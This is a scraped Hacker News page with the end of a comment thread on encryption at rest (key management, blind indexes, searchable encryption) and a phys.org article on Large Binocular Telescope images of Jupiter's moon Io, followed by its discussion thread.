hours agoparentprevI think it's very valuable for people who might not already now this to see an example of why it's true, as the post does: > \"What’s happening here is simple: The web application has the ability to decrypt different records encrypted with different keys. If you pass records that were encrypted for Alice to the application to decrypt it for Bob, and you’re not authenticating your access patterns, Bob can read Alice’s data by performing this attack.\" An interesting question here is whether or not there's a god key that allows the administrator to decrypt all the data even if they can't authenticate as the user (or if they just have copies of all keys). Searching HN for 'lavabits' turns up some results related to this, e.g. https://www.eff.org/press/releases/eff-has-lavabits-back-con... reply withinboredom 6 hours agoprevI once reviewed a php library (don't remember which one but it was extremely popular) using `mb_strlen($string)` to get bytes to encrypt/decrypt. It was just waiting for someone to come along and en/decrypt with a non-english language. reply CiPHPerCoder 5 hours agoparentWas it similar to this? https://github.com/facebookarchive/php-graph-sdk/pull/552#is... reply withinboredom 24 minutes agorootparentThat’s probably what they were going for, but no, it was just regular mb_stelen with a single arg. reply deprave 4 hours agoprevEncryption at Rest makes it easy to reason about data hygiene, since access to the data is gated through access to the keys. You want to delete data? Toss the keys. You want to confidentially process data? Make the keys available to a TEE or such. You want to prevent yourself from having constant access to the data? Let the client provide the keys. And of course, you want to protect the keys? Use an HSM. reply jnwatson 1 hour agoprevThe article has some great points but has an unfortunate title that has lead to an argument the author isn't making. The cryptographic details about preventing confused deputy are excellent and worth studying. reply chadsix 5 hours agoprev> Then, if your server’s hard drive grows legs and walks out of the data center, your users’ most sensitive data will remain confidential. > Unfortunately, for the server-side encryption at rest use case, that’s basically all that Disk Encryption protects against. If you aren't able to self host, then encryption at rest is a real use case and the next best thing to actually controlling your data. That being said, obviously self hosting with FDE@Rest is the best. Or you can end up like the people who lost their data [1][2]. [1] https://spectrum.ieee.org/thousands-of-bitcoins-stolen-in-a-... [2] https://www.youtube.com/watch?v=g_JyDvBbZ6Q reply plingbang 4 hours agoparent> Or you can end up like the people who lost their data [1] I don't see how encryption at rest could've changed the outcome. In the article, the cloud provider, which has full control over the VMs, was compromised. The VMs were hosting various Bitcoin services, which needed continuous wallet access for operation. So, I'd say there was no data at rest to be secured. The attackers could theoretically patch the application to make malicious transactions or just extract the wallet from RAM. Also, the article suggests that the attackers were getting inside the running VMs rather than accessing VM storage directly. reply amluto 5 hours agoprevAn issue that wasn’t mentioned: protecting an encryption-at-rest key is not so easy, and the solutions I’ve heard of that are easy to deploy are barely effective against an attacker with physical access to the datacenter. reply hansvm 5 hours agoparent> Cryptography is a tool for turning a whole swathe of problems into key management problems. Key management problems are way harder than (virtually all) cryptographers think. reply salawat 5 hours agorootparent>Cryptography is a tool for turning a whole swathe of problems into key management problems. Key management problems are way harder than (virtually all) cryptographers think. As someone who has issues remembering where they left their house keys at times, I want this on a bloody coffee cup/t-shirt. Further, every practicing cryptographer everywhere should be forced to keep one on their person at all times, and be required to present it to do normal tasks as a reminder to them of the suffering their work creates for others implementing their cryptosystems. They probably won't care. But it'd make me feel better if they were as annoyed in the everyday as much as I am wrangling this kind of nonsense. reply CiPHPerCoder 4 hours agorootparent> As someone who has issues remembering where they left their house keys at times, I want this on a bloody coffee cup/t-shirt. I've heard this quote a lot over the years, but the first person who said it was probably Lea Kissner, the former CISO of Twitter. Here's their most recent post of the same statement: https://hachyderm.io/@leak/110784289970982813 reply motohagiography 4 hours agoprevThe main threat to encrypting health information is actually dishonest cryptographers. The quality of healthcare privacy reasoning is like, instead of searching for user Michael Knight in a database of cancer patients, you hash the name, use a bloom filter to determine if the hash exists in the protected data set or not, and then tell your regulators and the public that the foreign jurisdiction research assistants hired from fiverr don't have access to your health information because everything is encrypted and we only compare hashes. it's like that \"sudo make me a sandwich,\" cartoon but, \"cryptographically disclose your health information.\" reply CiPHPerCoder 4 hours agoparent> The main threat to encrypting health information is actually dishonest cryptographers. Wow, okay, you have me hooked. > instead of searching for user Michael Knight in a database of cancer patients, you hash the name, use a bloom filter to determine if the hash exists in the protected data set or not The protocol you loosely described here could be either totally fine or horrendously broken depending on the implementation details and architecture of the application. Not to mention the universal cryptography concerns; i.e., key management. > and then tell your regulators and the public that the foreign jurisdiction research assistants hired from fiverr don't have access to your health information because everything is encrypted and we only compare hashes. You've said \"hashes\" twice now, so I have to ask: 1. Are they only hashing, or are they using a keyed hash (e.g., HMAC)? 2. Are they doing something ridiculous like using MD5? If you're familiar with cryptography at all, passing around MD5(data) is vastly different from truncating HMAC-SHA384(data, staticKey) to a few bits and protecting staticKey with an HSM. Without more detail, I can't tell if your assertion that cryptographers are being dishonest is warranted. It's sort of like simplifying RSA encryption to \"multiplying integers\". Yes, that's what's happening on some level, but some essential information was omitted. reply motohagiography 3 hours agorootparentin your hmac example you have a separate key to manage, whereas in my example, it's implied it's sha256 or a variant that provides a layer of obfuscation in the lookup, and may even implement a \"standard\" to fool regulators. most regulations and standards say what tools to use (key bits, algos, etc) , and not that the implementations need to be approved by a professional. my example is that the scheme uses tools in a way that is meaningless because I can just take a phone book, hash the names, and check to see if they are in the cancer database as though it were an cleartext database. to say the data subject's data is private in this case because it is hashed (or often, inaccurately, \"encrypted\") is to mislead people who make decisions about it. I'm saying the designers of such systems represent themselves as cryptography and security experts who build weakened systems like this to mislead regulators on behalf of their bosses and users who just want the cleartext data. most protocols are a shell game where if you don't know where the root of trust secret is managed you're the sucker at the table. my experience has been that working cryptographers (protocol designers) in government, health, and financial institutions in general are a very refined class of bullshitters who pound the table whenever you ask them about details, and that one should not be intimidated by their theatrics. Hence in PHI management, dishonest cryptographers working on behalf of anti-privacy interests are the main threat. reply CiPHPerCoder 3 hours agorootparentThanks for clarifying, and confirming at least one of my suspicions. All I can say here is, \"Yikes.\" If you (or, well, anyone) ever need an honest third party to audit a cryptography design--whether it's because you suspect bullshit or just want assurance that it's actually a good design--talk to the Crypto team at Trail of Bits. https://www.trailofbits.com/services/software-assurance/cryp... reply SigmundA 5 hours agoprevFull disk encryption or similarly transparent data encryption at the database allows you to continue to use the database as a full database. Decrypting on the \"client\" (app server) means you can't really use its native query language (SQL) effectively on the encrypted columns. Not sure what the state the art is in searchable encryption for db indexes, but just trying to do stuff that requires a scan becomes untenable due to having to read and decrypt on the client to find it or aggregate it. The security sandbox becomes app server memory instead of db server memory preventing effective use of the locality on the db server. I didn't see the article address this. Can make sense to encrypt specific sensitive columns that are not used for searches or aggregations later, but many systems the reason you have discrete data columns is to query them later not just retrieve a single record to decrypt and view on screen vs just storing a single document and encrypting / decrypting. Disk encryption is easy to use without reducing the functionality of the DB, client encryption specifically and purposely handicaps the functionality of the DB so its use case is very narrow IMO. I tend to treat both the app server and db ram as unencrypted so they require good access controls to use them (don't let Bob run sql queries against all the data unless he is authorized to do so). reply CiPHPerCoder 5 hours agoparent> Not sure what the state the art is in searchable encryption for db indexes, but just trying to do stuff that requires a scan becomes untenable due to having to read and decrypt on the client to find it or aggregate it. There are a lot of different approaches, but the one CipherSweet uses is actually simple. First, take the HMAC() of the plaintext (or of some pre-determined transformation of the plaintext), with a static key. Now, throw away most of it, except a few bits. Store those. Later, when you want to query your database, perform the same operation on your query. One of two things will happen: 1. Despite most of the bits being discarded, you will find your plaintext. 2. With overwhelming probability, you will also find some false positives. This will be significantly less than a full table scan (O(log N) vs O(N)). Your library needs to filter those out. This simple abstraction gives you k-anonymity. The only difficulty is, you need to know how many bits to keep. This is not trivial and requires knowing the shape of your data. https://ciphersweet.paragonie.com/security#blind-index-infor... I proposed the same technique to AWS, who adopted it under the name Beacons for the AWS Database Encryption SDK. https://docs.aws.amazon.com/database-encryption-sdk/latest/d... reply adunsulag 4 hours agorootparentI was reading your reply and started thinking, this sounds a lot like what I did to do encrypted search with Bloom Filters and indexes. I click on the first link and find the exact website I used when researching and building our encrypted search implementation for a health care startup. It worked fabulously well, but it definitely requires a huge amount of insight into your data (and fine-tuning if your data scales larger than your initial assumptions). That's awesome that AWS has now rolled it into their SDK. I had to custom build it for our Node.JS implementation running w/ AWS's KMS infrastructure. Are you the author of the paragonie website? The coincidence was startling. If so, I greatly thank you for the resource. Edit After going back and re-reading the blog post, looks like you are the author. Again thank you, you were super helpful . reply CiPHPerCoder 4 hours agorootparent> Are you the author of the paragonie website? The coincidence was startling. If so, I greatly thank you for the resource. Thanks. Yes, I'm one of the authors. reply withinboredom 5 hours agoparentprevOne way I’ve seen (eg, searching by zip code) is to encrypt all possible buckets you would search by (prefixes/suffixes) using a different (search) key, then encrypting the relationship foreign keys. Then the application searches for the encrypted values and decrypts the foreign keys. reply kbolino 5 hours agorootparentThis strategy provides only obfuscation, not encryption. If the same plaintext always \"encrypts\" to the same ciphertext, it becomes possible (sometimes even trivial) for an attacker with access to large amounts of related information (such as the entire database) to use correlations and inference to effectively decipher it. reply withinboredom 4 hours agorootparentOne-time-pads effectively save you here. The application knows zipcode 1234 == \"AWER\", but the database doesn't and there isn't any way to derive that without outside information. The technique is a pseudo-anonymization technique, not encryption. reply kbolino 3 hours agorootparentAssuming you want \"find all users in zipcode 12345\" to be a supported query, it does not matter what encryption scheme you use, you will have one of these two problems: On the one hand, you can require that 12345 always maps to AWERQ, in which case an attacker can use frequency analysis, metadata chaining, etc. to determine with some confidence that AWERQ = 12345. Calling this \"pseudo-anonymization\" is definitely more accurate than calling it \"encryption\", but you might as well just use a one-way hash function instead. It doesn't do anything against determined attackers with prolonged or broad exposure to the data; I don't see the value except perhaps for compliance with poorly thought out or outdated regulations. On the other hand, you can require that 12345 always maps to a different string every time, but that means you need a different key/salt/IV/nonce for every row or cell, defeating indexing and aggregation, and so all queries become full table scans. This significantly frustrates an attacker, but also significantly frustrates legitimate operations. reply FooBarWidget 5 hours agoprevReal life case study: We armed our servers (VPSes) to the teeth. Then an attacker gained access to our hosting provider's administration panel. They used that to download our hard disk content. Encryption at rest protects against this. reply tossandthrow 4 hours agoparentEncrypting your volumes would have mitigated this, and indeed you should have. reply 29athrowaway 6 hours agoprev [–] Encryption at rest is misleading. It is often used to describe an insecure situation consisting of disk encryption only instead of encrypted data store values. reply doubled112 6 hours agoparentEncryption at rest is great if I forget my laptop on a bus. Reduces it to a VISA problem. But who is stealing data off of servers by taking the server? Maybe it saves you when you dispose of the disks? Maybe a home server in a break in? This has always seemed obvious to me. reply dspillett 3 hours agorootparent> But who is stealing data off of servers by taking the server? Away from pure bare metal, in the presence of bugs in security separation someone could steal data simply by having a VM on the same server as yours. Encryption at-rest with each VM or service/account having their own keys removes the risk of data accidentally becoming visible in another environment that is sharing the hardware. Though the chance of some useful data being revealed this way is pretty small on large scale cloud installations, and if you are using a cheap VPS host for sensitive data you might not be valuing your data enough. reply erinnh 6 hours agorootparentprevI can think of two reasons: - Physically moving servers outside of the cages they are supposed to be in. (inside/outside DC) - Easier to dispose of disks (repair/EOL) reply zsims 6 hours agorootparentprevThere are other paths to the attack he mentioned. Eg you find an API that accepts ciphertext or part of. Or a cloud backup/restore flow. Likely you need another vulnerability but it does happen. reply immibis 49 minutes agorootparentprevIt has happened before that disks have been taken from servers in third-party data centers. Most commonly by the feds, but also by other actors. Do you control the physical security of your server? reply thom 6 hours agoparentprev [–] The article explains why the former is often just security theatre. reply tasn 6 hours agorootparent [–] Calling it security theater is a bit harsh, though it's definitely not a cure all solution. It does protect against physically taking of and improper disposal of HDs when done correctly. Which can be quite a significant vector. reply klabb3 6 hours agorootparent [–] It’s not security theatre in the rare case that the stated goals is to protect against physical attacks, or for hardware disposal. If the goal is to put “military grade encryption” sticker in the sales deck, or to pass some certification, or to create a vague cloud of plausibility that you’re taking security seriously in some other way, then absolutely it’s security theatre. It deserves to be called out. reply jeffbee 6 hours agorootparent [–] It's not \"theater\" if the customer requires that certification. reply mbb70 5 hours agorootparent [–] If the customer wants a show, give them a show. Doesn't make it not theater. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The blog post \"Encryption At Rest: Whose Threat Model Is It Anyway?\" addresses common misunderstandings about encrypting data at rest in web and cloud applications, emphasizing the importance of proper implementation.",
      "It advocates for client-side encryption and highlights the role of key management systems (KMS) and AEAD constructions like AES-GCM and XChaCha20-Poly1305 to enhance security.",
      "The post underscores the need for developers to consult cryptography experts, improve their threat modeling skills, and stay informed about security vulnerabilities and mitigation strategies."
    ],
    "commentSummary": [
      "The discussion underscores the importance of understanding threat models in cloud services, particularly internal threats and risks posed by cloud provider personnel.",
      "It highlights the role of Cloud Key Management Services (KMS) in securely managing encryption keys and the limitations of encryption at rest, which does not protect against online attackers or internal threats.",
      "The conversation critiques \"security theater\" and stresses the need for robust cryptographic methods, secure key management, and a layered security strategy beyond just encryption."
    ],
    "points": 171,
    "commentCount": 130,
    "retryCount": 0,
    "time": 1717500318
  },
  {
    "id": 40569949,
    "title": "Ground-Based Telescope Captures Stunning High-Resolution Images of Jupiter's Volcanic Moon Io",
    "originLink": "https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html",
    "originBody": "May 31, 2024 Editors' notes This article has been reviewed according to Science X's editorial process and policies. Editors have highlighted the following attributes while ensuring the content's credibility: fact-checked peer-reviewed publication trusted source proofread Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft by Daniel Stolte, University of Arizona The UArizona-managed Large Binocular Telescope on Mount Graham is the only one of its kind, with two 27-foot mirrors mounted side by side. A powerful adaptive optics system compensates for blurring introduced by atmospheric turbulence, making it one of the most powerful Earth-based observatories in the world. Credit: NASA New images of Jupiter's volcano-studded moon Io, taken by the Large Binocular Telescope on Mount Graham in Arizona, offer the highest resolution of Io ever achieved with an Earth-based instrument. The observations were made possible by a new high-contrast optical imaging instrument, dubbed SHARK-VIS, and the telescope's adaptive optics system, which compensates for the blurring induced by atmospheric turbulence. The images, to be published in the journal Geophysical Research Letters, reveal surface features as small as 50 miles across, a spatial resolution that until now had been achievable only with spacecraft sent to Jupiter. This is equivalent to taking a picture of a dime-sized object from 100 miles away, according to the research team. SHARK-VIS allowed the researchers to identify a major resurfacing event around Pele, one of Io's most prominent volcanoes. According to the paper's first author, Al Conrad, the eruptions on Io, the most volcanically active body in the solar system, dwarf their contemporaries on Earth. \"Io, therefore, presents a unique opportunity to learn about the mighty eruptions that helped shape the surfaces of the Earth and the moon in their distant pasts,\" said Conrad, associate staff scientist at the Large Binocular Telescope Observatory. The Large Binocular Telescope, or LBT, is part of Mount Graham International Observatory, a division of the University of Arizona Steward Observatory. Conrad added that studies like this one will help researchers understand why some worlds in the solar system are volcanic but not others. They also may someday shed light on volcanic worlds in exoplanet systems around nearby stars. Slightly larger than Earth's moon, Io is the innermost of Jupiter's Galilean moons, which in addition to Io, include Europa, Ganymede and Callisto. Locked in a gravitational \"tug of war\" among Jupiter, Europa and Ganymede, Io is constantly being squeezed, leading to frictional heat buildup in its interior—believed to be the cause for its sustained and widespread volcanic activity. By monitoring the eruptions on Io's surface, scientists hope to gain insights into the heat-driven movement of material underneath the moon's surface, its internal structure and ultimately, on the tidal heating mechanism responsible for Io's intense volcanism. Io's volcanic activity was first discovered in 1979, when Linda Morabito, an engineer on NASA's Voyager mission, spotted an eruption plume in one of the images taken by the spacecraft during its famous \"Grand Tour\" of the outer planets. Since then, countless observations have been made that document Io's restless nature, from both space and Earth-based telescopes. Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope. The image combines three spectral bands — infrared, red and yellow — to highlight the reddish ring around the volcano Pele (below and to the right of the moon's center) and the white ring around Pillan Patera, to the right of Pele. Credit: INAF/Large Binocular Telescope Observatory/Georgia State University; IRV-band observations by SHARK-VIS/F. Pedichini; processing by D. Hope, S. Jefferies, G. Li Causi Study co-author Ashley Davies, a principal scientist at NASA's Jet Propulsion Laboratory, said the new image taken by SHARK-VIS is so rich in detail that it has allowed the team to identify a major resurfacing event in which the plume deposit around a prominent volcano known as Pele, located in Io's southern hemisphere close to the equator, is being covered by eruption deposits from Pillan Patera, a neighboring volcano. A similar eruption sequence was observed by NASA's Galileo spacecraft, which explored the Jupiter system between 1995 and 2003. \"We interpret the changes as dark lava deposits and white sulfur dioxide deposits originating from an eruption at Pillan Patera, which partially cover Pele's red, sulfur-rich plume deposit,\" Davies said. \"Before SHARK-VIS, such resurfacing events were impossible to observe from Earth.\" While telescope images in the infrared can detect hot spots caused by ongoing volcanic eruptions, they are not sharp enough to reveal surface details and unambiguously identify the locations of the eruptions, explained co-author Imke de Pater, professor emerita of astronomy at the University of California—Berkeley. \"Sharper images at visible wavelengths like those provided by SHARK-VIS and LBT are essential to identify both locations of eruptions and surface changes not detectable in the infrared, such as new plume deposits,\" de Pater said, adding that visible light observations provide researchers with vital context for the interpretation of infrared observations, including those from spacecraft such as Juno, which is currently orbiting Jupiter. SHARK-VIS was built by the Italian National Institute for Astrophysics at the Rome Astronomical Observatory and is managed by a team led by principal investigator Fernando Pedichini, assisted by project manager Roberto Piazzesi. In 2023, it was installed, together with its complementary near-infrared instrument SHARK-NIR, at the LBT to fully take advantage of the telescope's outstanding adaptive optics system. The instrument houses a fast, ultra-low-noise camera that allows it to observe the sky in \"fast imaging\" mode, capturing slow-motion footage that freezes the optical distortions caused by atmospheric turbulence, and to post-process data to an unprecedented sharpness. Gianluca Li Causi, data processing manager for SHARK-VIS at the Italian National Institute for Astrophysics, explained, \"We process our data on the computer to remove any trace of the sensor's electronic footprint. We then select the best frames and combine them using a highly efficient software package called Kraken, developed by our colleagues Douglas Hope and Stuart Jefferies from Georgia State University. Kraken allows us to remove atmospheric effects, revealing Io in incredible sharpness.\" SHARK-VIS instrument scientist Simone Antoniucci said he anticipates new observations to be made of objects throughout the solar system. \"The keen vision of SHARK-VIS is particularly suited to observing the surfaces of many solar system bodies, not only the moons of giant planets but also asteroids,\" he said. \"We have already observed some of those, with the data currently being analyzed, and are planning to observe more.\" More information: Observation of Io's Resurfacing via Plume Deposition Using Ground-based Adaptive Optics at Visible Wavelengths with LBT SHARK-VIS, Geophysical Research Letters (2024). DOI: 10.1029/2024GL108609. On arXiv: arxiv.org/abs/2405.19604 Journal information: Geophysical Research Letters , arXiv Provided by University of Arizona Citation: Glimpses of a volcanic world: New telescope images of Jupiter's moon Io rival those from spacecraft (2024, May 31) retrieved 4 June 2024 from https://phys.org/news/2024-05-glimpses-volcanic-world-telescope-images.html This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no part may be reproduced without the written permission. The content is provided for information purposes only.",
    "commentLink": "https://news.ycombinator.com/item?id=40569949",
    "commentBody": "New telescope images of Jupiter's moon Io rival those from spacecraft (phys.org)164 points by wglb 17 hours agohidepastfavorite50 comments whimsicalism 15 hours agoThe telescope photo: https://scx2.b-cdn.net/gfx/news/hires/2024/glimpses-of-a-vol... Stitched spacecraft photo: https://science.nasa.gov/resource/high-resolution-global-vie... This seems awesome but I would say 'rival those' is a bit of a stretch reply rbanffy 10 hours agoparentIt rivals images from spacecraft in Earth orbit - as in Hubble or Webb. It won’t rival images from cameras sent to the near vicinity of the targets, but those can take decades from the moment you decide to take a picture to the time you take it, unless you already decided you’d take some pictures from that general location decades prior. reply shiroiushi 10 hours agorootparent>It rivals images from spacecraft in Earth orbit - as in Hubble or Webb. (emphasis mine) It seems like this critical detail was left out of the headline. reply rbanffy 8 hours agorootparentStill technically correct, the best kind of correct. I wonder how much cheaper are land-based telescopes over the lifetime of instruments such as the Hubble or the Webb. Also, a huge shame the Overwhelmingly Large Telescope was cancelled. We need more creative names for those. reply kloch 3 hours agorootparentAngular resolution through the Atmosphere has been solved with adaptive optics and advanced mathematical techniques. Unfortunately, nothing can remove the temperature of the atmosphere (which affects infrared imaging), or the absorption of many wavelength bands. reply alfiopuglisi 1 hour agorootparentprev> I wonder how much cheaper are land-based telescopes over the lifetime of instruments such as the Hubble or the Webb. 10-100 times cheaper. An LBT night is around $50k-100k, which over 10 years corresponds to $300 millions. JWST total budget is about $10 billions. True, JWST can operate close to 24/7. On the other hand, land-based telescopes are under constant refurbishment and upgrades, and they become more powerful over time. reply WrongAssumption 2 hours agorootparentprevDoesn’t change your point, as I believe you are mainly referring to distance from the object being observed. But Webb orbits the sun. reply OldGuyInTheClub 14 hours agoparentprevI was quite taken by the ground-based photo but agree with you upon comparing the links. 50 mile resolution (LBT) vs. 1.6 miles (Galileo) is pretty cut-and-dried. Maybe the point is that LBT can do this for other objects not around Jupiter? reply WillAdams 4 hours agorootparentExactly --- a fly-by of everything in the asteroid belt for example would be a budget-buster --- what is there in the belt which it would be interesting to have photos of? reply dylan604 4 hours agorootparentMy high score!! Or we could see which asteroid Han Solo is hiding the Millennium Falcon in. Or we could see all of the illegal mining operations by those pesky guys from Plural Zed Alpha Nine Nine. We don't know what we won't see until we don't see it. reply max-ibel 12 hours agoparentprevI agree; I'm thinking that's it's useful to be able to get frequent snapshots of the whole moon at this resolution (if you are interested in time lapse to track volcanic activity for instance). The satellite-based stitched photo probably took a long time to collect. Also, without knowing details, I suspect you can improve the LBT images as the system matures, but as you say, probably not at the resolution the satellite provides. reply boffinAudio 10 hours agoparentprevIt depends what the parameters for rivalry are .. a ground-based telescope can take multiple photo's, perhaps even thousands, at very low cost - although the resolution may not be comparable, this doesn't discount the value of the data to the scientists who are obtaining it at a far greater reduction of cost and effort than those who rely on space-based instruments. Remember, we don't have a permanent instrument stationed at Io - these spacecraft are doing fly-by's and thus have a limited window of opportunity. So, while the resolution may be great eye-candy, the consistency of the data over time is vastly different. \"Higher resolution\" does not always mean \"better science\", especially if its a one-shot compared to thousands of data-samples... reply holoduke 9 hours agoparentprevThat telescope image is the current highest res. Not from the new telescope. That is yet to be released. reply petesergeant 8 hours agorootparentAre you sure? The image is captioned: “Jupiter moon Io, imaged by SHARK-VIS on Jan. 10, 2024. This is the highest resolution image of Io ever obtained by an Earth-based telescope” reply minimalc 3 hours agoprevI work for the company (Oxford Instruments Andor) that produces the cameras for this telescope: https://sites.google.com/inaf.it/shark-vis/instrument/detect... A great achievement! It's very exciting to be a (small) part of this, happy to answer any camera software questions (can't speak for the observatory's software though as I haven't seen it) reply GrantMoyer 2 hours agoparentAwesome work! Are the cameras similar to what's in a consumer digital camera, that is, a single image sensor behind a bayer filer and a lens? Or does it use some other configuration, like an array of image sensors? And does sensor readout work similarly to a consumer camera, sequentially reading out rows of sensor data? Is there any cool software processing during the capture, like decovolution? reply minimalc 1 hour agorootparent> Are the cameras similar to what's in a consumer digital camera, that is, a single image sensor behind a bayer filer and a lens? Yes they're quite similar to consumer camera sensors, our sensors are usually from high quality production bins. We advertise this quality as \"scientific CMOS\" (sCMOS) to help highlight this. Consumer sensors can have a significant number of sensor defects which can be corrected so they aren't noticeable in casual photographs, but these defects are very detrimental for scientific imaging where quality is paramount. Another big difference is the noise and quantum efficiency characteristics of the sensor which is another key requirement for scientific instruments. We don't supply lens', I think the logic is that scientific customer's know exactly what kind of optical setup they want so most customer's would tend to use their own optical equipment or buy it in. Our camera's are monochrome (scientific cameras tend to care more about raw resolution than having a smaller res with bayer layer) so customers typically use different color/wavelength filters to get what they want and process them into true color images later if needed. > Or does it use some other configuration, like an array of image sensors? This particular camera, the Zyla has just one sensor. Though it is a little unique in our portfolio, in that the sensor can be read out from both halves simultaneously in various patterns. If your interested in the hardware we provide lots of info in our hardware manual: https://andor.oxinst.com/downloads/uploads/Zyla_hardware_use... I don't think we offer multi-sensor solutions, though I could be wrong. > And does sensor readout work similarly to a consumer camera, sequentially reading out rows of sensor data? Yes, there are two electronic shuttering modes we offer: rolling and global. Rolling takes a sequential row by row readout, and global does a readout of the entire sensor. The camera's used by the observator can only do rolling, but we have other Zyla models which also do global. There can be tradeoffs in choosing which one to use, typically framerate, noise and image distortion are the key factors in choosing. Global is available on some high end consumer cameras, but generally most consumer sensors will do rolling. Though this may have changed since I last looked. > Is there any cool software processing during the capture, like decovolution? In the camera side of the company, we try to leave the image as clean and raw as possible. We perform correction processing during acquisition on the camera; as high quality as the bins are, you still have to correct and characterize for various things to get the best performance in a scientific scenario. In the applications side of the company we do all kinds of image processing: deconvolution (this is a big deal in the confocal microscopy world, we have our own patented deconvolution method: srrf-stream) https://fusion-benchtop-software-guide.scrollhelp.site/fusio..., AI analysis, 3d/4d imaging (https://imaris.oxinst.com/). Probably lots more I don't know about (I'm on the camera side). reply drewrv 2 hours agoparentprevHow does the \"compensation for atmospheric turbulence\" work? It honestly sounds impossible, like those tv shows where the detective \"enhances\" a blurry photo. reply minimalc 1 hour agorootparentSorry I'm not a big expert in the field of optics, but I am aware of our cameras being used to perform adaptive optics and lucky imaging. Adaptive optics in particular requires very fast framerates and low latency to make rapid adjustments to the mirror's shape to compensate for the constantly changing atmosphere. It's really amazing that it's possible at all! I believe this is the method used here, though I can't say with certainty. Lucky imaging is more akin to a brute force method, where you acquire lots and lots of images quickly and process the best ones when the atmosphere was being particularly cooperative at the time and not distorting the image very much. Again, there are lots of experts out there on the topic, this is just my simple view into it. reply alfiopuglisi 1 hour agorootparentprevIt's a technological tour-de-force involving deformable mirrors that change shape every millisecond, cameras able to count every incoming photon, and special computers designed to calculate the next correction within microseconds. As usual wikipedia has an introduction: https://en.wikipedia.org/wiki/Adaptive_optics Or try: https://andor.oxinst.com/learning/view/article/introduction-... reply hindsightbias 2 hours agoparentprevIs this installed on one of the telescopes or integrated between both? I read about the LBT once and it seemed some instruments were on one and some were integrated. I assume it's used as a mono and binoc platform, depending. reply alfiopuglisi 1 hour agorootparent> I assume it's used as a mono and binoc platform, depending. Correct, it depends on the observation. Both sides have adaptive optics correction, but they work independently. This particular instrument (SHARK-VIS) is mounted on the \"right\" side, while SHARK-NIR is on the \"left\" side. reply minimalc 1 hour agorootparentprevI'm not quite sure about their exact optical setup, I know the Zyla's are used in the shark-vis instrument[0]. I would guess from their article that one Zyla is dedicated to adaptive optics and one for imaging. [0] https://sites.google.com/inaf.it/shark-vis/instrument/detect... reply ggm 13 hours agoprevYou would think an article comparing images would.. well would show you the two images side-by-side. From the post(s) below It's impressive but its definitely lower res. Over the life of managing telescopes, is it actually cheaper than a craft in orbit? reply pulvinar 13 hours agoparentYes, the LBT could theoretically do 0.006 arcsecond resolution in binocular configuration (22.8 meter aperture), which is about 14 feet at Jupiter distance, or 10 times worse at best. But then it costs 10 times less, and can see the whole universe at that resolution. reply dakr 12 hours agorootparentPresumably you meant to say 14 miles, not 14 feet. Also, since the adaptive optic system acts on the near-IR light, let's shift the 500nm used to calculate the Rayleigh criterion to at least 1 micron, which doubles the limiting resolution to around 0.011 arcsec. reply pulvinar 0 minutes agorootparentYes, sorry, 14 miles (a wishful typo!) SiempreViernes 9 hours agorootparentprevClose, 16 mas in R: https://sites.google.com/inaf.it/shark-vis/home reply eternauta3k 14 hours agoprevFor those interested in the telescope, I highly recommend this Omega Tau episode: https://omegataupodcast.net/111-optical-astronomy-and-the-la... reply SiempreViernes 9 hours agoprevAn Italian instrument apparently, built by the Rome observatory: https://sites.google.com/inaf.it/shark-vis/home reply bloopernova 3 hours agoprevThe ever-changing surface of so many planets leads me to wish we had satellites in orbit around as much as possible. I'd love to read the \"weather report\" for Io or Titan! reply VikingCoder 4 hours agoprevIf I'm doing my math correctly, Io covers about 0.06% as many degrees of our vision from Earth as the moon does. (I'm not good at this math, but I'm trying.) Io Diameter 2263.8 miles Jupiter Distance to Earth 444000000 miles Perp / Base 0.000005098648649 Radians 0.000005098648649 Degrees 0.0002922792219 Arc Seconds 1.052205199 === Moon Diameter 2159.1 miles Moon Distance to Earth 238900 miles Perp / Base 0.009037672666 Radians 0.009037426614 Degrees 0.5180690416 Arc Seconds 1865.04855 reply IncreasePosts 3 hours agoparentThe moon and Io are roughly the same diameter, so you can just divide Io's distance by the moon's distance to get the ratio of their perceived size without futzing with angles or geometry. reply wthomp 15 hours agoprevI visited the Large binocular telescope just a month or two ago. A very impressive facility, and one can only imagine the image quality if they were captured using both mirrors coherently. reply ItsBob 10 hours agoprevCould they use the high-res orbiter photos, and the lower-but-still-really-good ground-based photos and use some sort of AI algo to enhance the ground-based ones? The idea being that they have high-res reference photos that are a one-shot deal but can take regular earth-based ones auto-enhance them from now on. It could then show changes over time in high res? I'm showing my limitations here, obviously, but I know what I mean... it makes sense in my head :) reply dylan604 4 hours agoparentBut for what purpose would an AI generative assisted image actually do for science? This is an issue I have with the gung-ho AI crowd that thinks AI should be used for anything and everything all the time. Even if you trained the model against the most detailed images available. That data was a mere snapshot of the exact time it was taken which in some cases is decades old. If things are actually changing on these bodies, then using that stale data to update current images would actually be damaging to science as it would be attempting to make the current look like the old. No! We need to see what it looks like now for the comparisons. Enhance! It can only go so far. Otherwise, you're just a low-rent Hollywood SFX team generating new worlds for whatever space opera you weren't hired to work on. reply sandos 6 hours agoparentprevSure, super-resolution exists in various forms and this is one. But this is an example of not actually adding any scientific information to the photo: extraplating data like that will never yield anything new or unexpected, so... reply ricksunny 5 hours agoprevSometimes (̶u̶s̶u̶a̶l̶l̶y̶?̶)̶ the tool is more interesting than the science it enables. reply bhouston 5 hours agoprevI would expect that the James Webb telescope could create even better images of Io if they pointed it there? As long as it could focus range to look at nearby objects... reply itishappy 4 hours agoparentSee for yourself: https://news.berkeley.edu/2023/07/27/james-webb-space-telesc... reply dylan604 4 hours agorootparentExpecting \"better\" from JWST compared to the image from TFA or even Hubble is definitely a misunderstanding of the differences between observation platforms. Just because the JWST mirror is larger than the Hubble's does not mean it will produce a \"better\" image as they are looking at different frequencies of light. Thinking that JWST will produce the same type of image with more detail/resolution is an incorrect way of thinking of the JWST's purpose. reply mikepurvis 5 hours agoparentprevIsn't JWST mostly about infrared though? That's the reason it has to be at L2, because those measurements are so much more sensitive to interference. These new Io images are in the visible spectrum, so it might be more apt to compare it to Hubble. reply BurningFrog 5 hours agorootparentTrue, but infrared images should have value in addition to the visible light images. reply lokimedes 11 hours agoprevSomebody should make a cave painting of these worlds, you know, just in case… reply yayr 11 hours agoparentwell, we've already buried all of github in the 